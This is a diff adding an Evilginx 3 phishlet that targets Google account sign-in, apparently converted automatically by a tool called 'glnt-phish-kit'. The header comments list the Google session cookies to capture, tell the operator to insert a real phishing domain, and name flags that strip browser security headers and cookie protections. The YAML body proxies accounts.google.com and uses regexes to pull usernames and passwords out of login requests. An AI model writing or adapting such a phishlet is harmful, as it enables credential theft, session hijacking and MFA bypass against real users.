@@ -1,0 +1,58 @@
+# =============================================================================
+# Evilginx 3 Phishlet — converted from google.json
+# =============================================================================
+#
+# IMPORTANT: This is an automated conversion. Operator MUST review before use.
+#
+# Session cookies (Evilginx auto-detects these; listed for operator reference):
+#   - SID
+#   - HSID
+#   - SSID
+#   - APISID
+#   - SAPISID
+#   - __Secure-1PSID
+#   - __Secure-3PSID
+#   - NID
+#   - OSID
+#   - LSID
+#
+# WARNING: The JSON phishlet did not define a hostname.
+#          A placeholder hostname "accounts.google.example.com" was generated.
+#          You MUST update proxy_hosts[].phish_sub and sub_filters[].hostname
+#          to match your actual phishing domain before using this phishlet.
+#
+# JSON rewrite flags active: strip_csp, strip_xfo, strip_hsts, strip_cookie_secure, strip_cookie_domain, rewrite_location
+# Evilginx auto_filter handles some of these; verify after deployment.
+#
+
+name: google
+author: "glnt-phish-kit"
+min_ver: "3.0.0"
+proxy_hosts:
+  - phish_sub: accounts
+    orig_sub: accounts
+    domain: google.com
+    session: true
+    is_landing: true
+    auto_filter: true
+sub_filters:
+  - hostname: accounts.google.example.com
+    sub: accounts
+    domain: google.example.com
+    replace:
+      from: accounts.google.example.com
+      to: accounts.google.com
+auth_urls:
+  - https://accounts.google.com/
+  - https://accounts.google.com/signin/
+  - https://accounts.google.com/v3/signin/
+  - https://accounts.google.com/_/signin/
+  - https://accounts.google.com/ServiceLogin
+  - https://accounts.google.com/AccountChooser
+  - https://accounts.google.com/signin/challenge/
+  - https://accounts.google.com/signin/oauth/
+landing_path: "/"
+user_re: "(?:identifier|Email|email|username)=([^&]+)"
+pass_re: "(?:Passwd|password|PasswdHidden)=([^&]+)"
+force_post: false
+is_mfa: false
